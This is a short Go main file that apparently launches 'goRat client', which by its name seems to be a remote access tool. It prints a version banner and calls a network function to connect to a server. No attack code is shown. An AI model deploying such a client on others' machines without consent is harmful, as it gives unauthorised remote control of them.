package main

import (
	"fmt"

	"github.com/viher3/gorat-client/config"
	"github.com/viher3/gorat-client/network"
)

func main() {
	conf := config.NewConfig()
	fmt.Println("############################")
	fmt.Println("### goRat client v"+conf.Version, "###")
	fmt.Println("############################")

	network.ConnectToServer(conf)
}
